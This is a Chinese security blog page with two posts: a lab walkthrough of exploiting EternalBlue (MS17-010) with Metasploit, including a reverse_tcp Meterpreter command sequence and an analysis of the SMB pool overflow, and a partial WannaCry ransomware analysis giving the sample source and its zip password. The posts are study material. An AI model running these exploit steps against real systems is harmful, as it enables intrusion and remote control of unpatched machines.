<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="昼短苦夜长，何不秉烛游">
<meta property="og:type" content="website">
<meta property="og:title" content="青晷">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="青晷">
<meta property="og:description" content="昼短苦夜长，何不秉烛游">
<meta property="og:locale">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/"/>





  <title>青晷</title>
  








<meta name="generator" content="Hexo 5.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">青晷</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">昼短苦夜长，何不秉烛游</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url">永恒之蓝漏洞利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-06T16:50:31+08:00">
                2021-04-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/r250414958/article/details/84887574">https://blog.csdn.net/r250414958/article/details/84887574</a></p>
<p><a target="_blank" rel="noopener" href="https://ti.qianxin.com/blog/articles/detailed-analysis-of-eternalblue/#:~:text=SMB_COM_NT_TRANSACT%3A,%E7%94%A8%E4%BA%8E%E6%89%93%E5%BC%80%E6%88%96%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%B9%B6%E5%BA%94%E7%94%A8%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7EA%E6%88%96%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6SD%20%E5%85%B6%E4%B8%AD%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B3%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84SMB_COM_TRANSACTION2%E5%91%BD%E4%BB%A4%E3%80%82">https://ti.qianxin.com/blog/articles/detailed-analysis-of-eternalblue/#:~:text=SMB_COM_NT_TRANSACT%3A,%E7%94%A8%E4%BA%8E%E6%89%93%E5%BC%80%E6%88%96%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%B9%B6%E5%BA%94%E7%94%A8%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7EA%E6%88%96%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6SD%20%E5%85%B6%E4%B8%AD%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B3%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84SMB_COM_TRANSACTION2%E5%91%BD%E4%BB%A4%E3%80%82</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control</a></p>
<p>渗透靶场、exploit脚本</p>
<p>第一次使用metasploit工具</p>
<h2 id="利用MSF框架进行简单攻击"><a href="#利用MSF框架进行简单攻击" class="headerlink" title="利用MSF框架进行简单攻击"></a>利用MSF框架进行简单攻击</h2><p>攻击机：Kali系统   </p>
<p>目标机1：Win7 x86   192.168.171.141</p>
<p>目标机2：Win7 x64   192.168.171.141</p>
<p>调用nmap对目标机1的端口进行扫描，发现了445端口</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409164440462.png" alt="image-20210409164440462" style="zoom:67%;">

<p>输入<code>msfconsole</code>启动metasploit，查找ms17有关的模块</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165111377.png" alt="image-20210409165111377"></p>
<p>使用<code>smb_ms17_010</code>模块检测目标机是否含有漏洞</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165351985.png" alt="image-20210409165351985"></p>
<p>使用<code>ms17_010_psexec</code>模块获取目标机权限</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165555421.png" alt="image-20210409165555421"></p>
<p>查看目标机ip，与之前一致</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409170017784.png" alt="image-20210409170017784" style="zoom:67%;">

<h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>该漏洞出现在Windows的SMB服务（服务器消息块协议，用于共享文件等），SMB服务使用IP地址访问时，使用445端口。</p>
<p>对目标机2（32位win7）采用以下攻击（32位的win7攻击模块需要自行配置）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/eternalblue_doublepulsar </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> lhost 192.168.171.134   </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> rhost 192.168.171.143    </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> processinject explorer.exe </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; run</span><br></pre></td></tr></table></figure>

<p>需要使用windbg对目标机2进行调试</p>
<p>安装后门前的表</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418153938467.png" alt="image-20210418153938467" style="zoom:67%;">

<p>安装后门后的表</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418153907477.png" alt="image-20210418153907477" style="zoom:67%;">





<p>下一个硬件断点<code>ba e1 0xFFDFF1F1</code>命中断点，查看堆栈，栈顶即是返回地址</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418155226658.png" alt="image-20210418155226658" style="zoom:67%;">

<p>查到了是来自srvnet.sys模块的!SrvNetCommonReceiveHandler+0x94</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418155424536.png" alt="image-20210418155424536"></p>
<p>查看一下调用堆栈，可以追溯到SrvNetWskReceiveComplete+0x72</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418165945612.png" alt="image-20210418165945612"></p>
<h4 id="关键漏洞分析"><a href="#关键漏洞分析" class="headerlink" title="关键漏洞分析"></a>关键漏洞分析</h4><p>CVE-2017-0144，可引发内存越界写，通过SMB协议的命令SMB_COM_TRANSACTION2触发，该命令会将数据包中的FEA_LIST转换为NTFEA_LIST，漏洞出现在函数SrvOs2FeaListToNt，该函数会调动函数SrvOs2FeaListSizeToNt计算FEA_LIST长度</p>
<p>SrvOs2FeaListSizeToNt函数中会将WORD型数据拷贝到DWORD中，只要原变量初始值大于FFFF，就可以伪造长度更长的长度，通过这一漏洞，攻击者可以伪造超长的FEA_LIST。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">SrvOs2FeaListSizeToNt</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _WORD *v1; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;                     <span class="comment">//*********</span></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1 + *a1;</span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">1</span>) &lt; v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v3 + <span class="number">4</span> &lt; v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(_WORD *)(v3 + <span class="number">2</span>) + *(_BYTE *)(v3 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 + v3 + <span class="number">4</span> + <span class="number">1</span> &gt; v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( RtlSizeTAdd(v6, (v4 + <span class="number">12</span>) &amp; <span class="number">0xFFFFFFFC</span>, &amp;v6) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      v3 += v4 + <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= v2 )</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">      v1 = a1;</span><br><span class="line">    &#125;</span><br><span class="line">    *v1 = (_WORD)(v3 - v1);    <span class="comment">// ******</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在对应处下断点，这里本来试图将FEALIST大小从00010000缩小到0000ff5d</p>
<p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210419193033970.png" alt="image-20210419193033970"></p>
<p>但却被转换成0001ff5d，结构变大，导致在之后使用错误长度进行memmove，导致pool溢出，造成一次越界写</p>
<img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210419193146430.png" alt="image-20210419193146430" style="zoom:67%;">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SRVNET_BUFFER</span>&#123;</span></span><br><span class="line">	<span class="comment">//offset froom POOLHDR:0x10</span></span><br><span class="line">	USHORT flag; <span class="comment">//0</span></span><br><span class="line">	<span class="keyword">char</span> pad[<span class="number">2</span>]; </span><br><span class="line">	LIST_ENTRY <span class="built_in">list</span>; <span class="comment">//4</span></span><br><span class="line">	<span class="comment">//offset form SRVNET_BUFFER: 0x30</span></span><br><span class="line">	<span class="keyword">char</span> *pnetBuffer; <span class="comment">//0C</span></span><br><span class="line">	DWORD netbufSize; <span class="comment">//size of netBuffer 10h</span></span><br><span class="line">	DWORD ioStatusInfo; <span class="comment">//copy Value of IRP.IOStatus.Information 14h</span></span><br><span class="line">	<span class="comment">//offset from SRVNET_BUFFER:0x40</span></span><br><span class="line">	MDL *pMdll; <span class="comment">//at offset 0x2c 18h</span></span><br><span class="line">	DWORD nByteProcessed;  <span class="comment">//1ch</span></span><br><span class="line">	DWORD Len;    <span class="comment">//20h</span></span><br><span class="line">	<span class="comment">//offset from SRVNET_BUFFER:0x50</span></span><br><span class="line">	PVOID Connection; <span class="comment">//size of this smb packet (from user) 24h</span></span><br><span class="line">	DWORD unknown; <span class="comment">//28h</span></span><br><span class="line">	<span class="comment">//MDL content starts at 0x2c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>越界写的关键是修改了srvnet_buffer对象的MDL和指向srvnet_recv的指针，之后的数据（即shellcode）可以通过tcp栈拷贝到MDL指定的内存，断开所有连接后最终会根据srvnet_recv寻址，最终会调用写入的shellcode</p>
<p>断开所有连接后最终会调到函数srvnet!SrvNetWskReceiveComplete，该函数会调用写入的shellcode</p>
<h4 id="漏洞利用1"><a href="#漏洞利用1" class="headerlink" title="漏洞利用1"></a>漏洞利用1</h4><p>关键漏洞要求发送的FEA LIST长度大于0x10000，但实际上FEA LIST存在于SMB_COM_TRANSACTION2命令中，发送一次该命令的数据包总长度最大值只能是FFFF，因此需要采用别的方法发送该命令</p>
<p>先发送一个SMB_COM_NT_TRANSACT，再发送多个SMB_COM_TRANSACTION2_SECONDARY命令，服务器接受到后会按照SMB_COM_TRANSACTION2处理</p>
<h4 id="漏洞利用2"><a href="#漏洞利用2" class="headerlink" title="漏洞利用2"></a>漏洞利用2</h4><p>永恒之蓝精细地构建了一系列连续的内存布局，这要求通过SMB协议远程稳定地申请并释放一段指定大小的pool内存，通过SMB_COM_SESSION_SETUP_ANDX命令实现。</p>
<p>该命令存在请求格式混淆的漏洞，在MS17-010补丁中未被修复，该漏洞可以使得服务端从错误的位置读取，创建一个指定大小的缓冲区，攻击者控制该缓冲区的连接断开后会形成一个大小可控的pool区域。</p>
<ul>
<li><p>分析永恒之蓝漏洞利用</p>
<ul>
<li><p>通过SMB_COM_TRANSACTION2命令触发内存越界写</p>
<p>在计算数据包中FEA_LIST长度时，会将单字拷贝到原双字数据中，攻击者可以借此伪造超长（大于等于0x10000）的FEA_LIST，在之后会使用错误长度进行memmove</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>构造长度大于FFFF的SMB_COM_TRANSACTION2命令</p>
<p>SMB_COM_TRANSACTION2命令数据包限长FFFF，而SMB_COM_NT_TRANSACT则可以发送大于FFFF的数据包。对于TRANSACTION指令，可以对指令进行拆分，后跟对应类型的_SECONDARY数据包，但实际上服务器端只会对最后一个 _SECONDARY包类型进行检查。</p>
<p>先发送SMB_COM_NT_TRANSACT数据包，后续发送一系列SMB_COM_TRANSACTION2_SECONDARY数据包，即可构造大于FFFF的SMB_COM_TRANSACTION2命令</p>
</li>
</ul>
<ul>
<li><p>构建内存布局，实现控制转移</p>
<p>控制转移通过修改SRVNET_BUFFER中MDL指针和指向SRVNET_RECV的指针实现，在断开所有连接后，会转移至servnet_recv结构指向的区域。</p>
<ul>
<li>申请多个SRVNET_BUFFER，可通过SMB 2协议产生，大小通过前4个字节控制</li>
<li>通过SMB_COM_SESSION_SETUP_ANDX命令的请求格式混淆漏洞，创建大小可控的pool内存区</li>
<li>继续申请SRVNET_BUFFER，确保与前者连续</li>
<li>断开第二步的连接，产生一个内存可控的内存空洞，后续紧跟一个SRVNET_BUFFER</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" itemprop="url">Wannacry勒索病毒分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-23T16:31:14+08:00">
                2021-03-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>可从该<a target="_blank" rel="noopener" href="https://github.com/ytisf/theZoo">项目</a>中获取到Wannacry样本</p>
<p>参考报告：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31507523/article/details/92418644">https://blog.csdn.net/qq_31507523/article/details/92418644</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/135722.html">https://www.freebuf.com/column/135722.html</a></p>
<h2 id="样本运行"><a href="#样本运行" class="headerlink" title="样本运行"></a>样本运行</h2><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133101852.png" alt="image-20210329133101852" style="zoom:80%;">

<p>样本文件夹</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133146211.png" alt="image-20210329133146211" style="zoom:80%;">

<ul>
<li>ed01…..exe：样本文件</li>
<li>taskdl.exe：删除临时目录和回收站下的所有后缀为<code>WNCRYT</code>”的文件</li>
<li>taskse.exe：</li>
<li>@WanaDecryptor：修改壁纸，定时弹出勒索窗口</li>
<li>00000000.eky：保存加密后的私钥</li>
<li>00000000.pky：保存公钥</li>
<li>00000000.res：保存时间信息</li>
<li>b.wnry：</li>
<li>c.wnry：保存比特币接收账户信息</li>
<li>r.wnry：一些勒索病毒作者留给受害者的说明信息</li>
<li>s.wnry：</li>
<li>t.wnry：保存主要恶意代码的加密文件</li>
<li>u.wnry：</li>
</ul>
<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="样本exe程序"><a href="#样本exe程序" class="headerlink" title="样本exe程序"></a>样本exe程序</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>进入IDA，main函数主要部分如下所示</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325135126646.png" alt="image-20210325135126646" style="zoom:80%;">

<p>详细分析最终结果可参考如下</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326174059894.png" alt="image-20210326174059894"></p>
<p>其中重要步骤的分析可参考如下部分</p>
<h4 id="修改注册表项"><a href="#修改注册表项" class="headerlink" title="修改注册表项"></a>修改注册表项</h4><p>由原<code>sub_4010FD</code>函数实现，该函数结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325135855022.png" alt="image-20210325135855022" style="zoom:80%;">

<ul>
<li>拼接字符串Destination为“Software\WanaCrypt0r”</li>
<li>分别在HKCU和HKLM中创建<code>Software\WanaCrypt0r</code>表，并分别设置表项名为“wd”，值为当前目录全路径</li>
</ul>
<p>修改结果如下图所示</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133742369.png" alt="image-20210329133742369" style="zoom:67%;">

<h4 id="释放资源节到文件"><a href="#释放资源节到文件" class="headerlink" title="释放资源节到文件"></a>释放资源节到文件</h4><p>由原<code>sub_401DAB</code>函数实现，参数为Str（‘WNcry@2ol7’），该函数结构为</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325140947904.png" alt="image-20210325140947904" style="zoom:80%;">

<ul>
<li><p>查找并载入资源节<code>XIA</code></p>
</li>
<li><p>调用函数<code>sub_4075AD</code>，使用到了参数Str，调用函数<code>sub_4075C4</code></p>
</li>
<li><p>以上两个函数都有些复杂，暂时不做进一步分析，先对资源节进行分析</p>
<p>用Resource Hacker查看该样本资源节</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325131946391.png" alt="image-20210325131946391"></p>
<p>该段二进制以PK开头，推测为zip压缩文件，提取出来试试看，确实是，还需要解压密码</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325132234721.png" alt="image-20210325132234721" style="zoom:67%;">

<p>由于之前用到了参数Str，推测解压密码为‘WNcry@2ol7’</p>
<p>用该字符串解压成功，在解压目录下存在如下文件</p>
<img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325133326123.png" alt="image-20210325133326123" style="zoom:67%;">

<p>合理推测之前两个函数为解压资源节并解析文件的操作</p>
</li>
<li><p>循环遍历释放的文件，比较该文件名与Str2（’c.wnry’）的关系，如果不等，则调用函数<code>sub_40763D</code>，释放该压缩过后的文件</p>
</li>
</ul>
<h4 id="写入比特币账户信息"><a href="#写入比特币账户信息" class="headerlink" title="写入比特币账户信息"></a>写入比特币账户信息</h4><p>由原<code>sub_401E9E</code>函数实现，该函数结构为</p>
<p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325143531454.png" alt="image-20210325143531454"></p>
<ul>
<li><p>对Source数组赋值</p>
</li>
<li><p>调用函数<code>sub_401000</code>，该函数结构比较清晰</p>
<ul>
<li>当第二个参数为1时，打开并读取文件<code>c.wnry</code></li>
<li>当第二个参数为0时，打开并写入文件<code>c.wnry</code></li>
</ul>
</li>
<li><p>因此可推测该函数会从以上三个字符串中随机选取一个写入到文件<code>c.wnry</code>中</p>
</li>
<li><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325150004411.png" alt="image-20210325150004411"></p>
